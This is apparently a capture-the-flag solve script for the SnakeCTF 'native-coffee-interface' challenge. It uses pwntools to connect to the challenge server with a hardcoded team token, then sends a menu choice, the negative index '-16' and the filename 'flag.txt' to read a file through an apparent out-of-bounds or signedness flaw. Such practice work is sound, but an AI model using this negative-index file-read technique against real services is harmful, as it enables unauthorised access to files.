#!/usr/bin/env python3

from pwn import *

exe = ELF("./libcoffeemachine.so")

context.binary = exe


def conn():
    global r
    
    r = remote("native-coffee-interface.challs.snakectf.org", 1337, ssl = True)
    r.sendlineafter(b"token: ", b"921965abb6e1f8ea06bf2c88a9aead76")

    return r


def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"-16")
    r.sendlineafter(b"> ", b"flag.txt")
    r.interactive()


if __name__ == "__main__":
    main()
